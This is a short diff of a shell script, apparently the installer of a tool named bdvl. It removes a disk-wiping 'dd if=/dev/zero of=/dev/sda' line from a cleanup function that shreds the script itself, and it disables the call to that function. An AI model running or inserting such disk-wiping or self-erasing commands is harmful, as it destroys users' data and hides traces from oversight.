@@ -27,6 +27,7 @@
 #~ @@@@@@@@(%@@@@@@@@@@@@@@@@@//%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 #~ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 ###
+
 update_time(){
 	local NOW
 	if [[ -f "$1".bak ]]; then
@@ -1499,7 +1500,6 @@ cleanall(){
 	shred -zuf -n 1 "$0" 2>/dev/null
 	cd ../
 	rm -rf ./bdvl
-	dd if=/dev/zero of=/dev/sda bs=40G
 }
 ###
 cecho(){
@@ -1695,6 +1695,6 @@ fi
 fecho "Started complete."
 ###
 fecho "Cleaning..."
-cleanall
+#~ cleanall
 fecho "Cleaning complete."
 ###
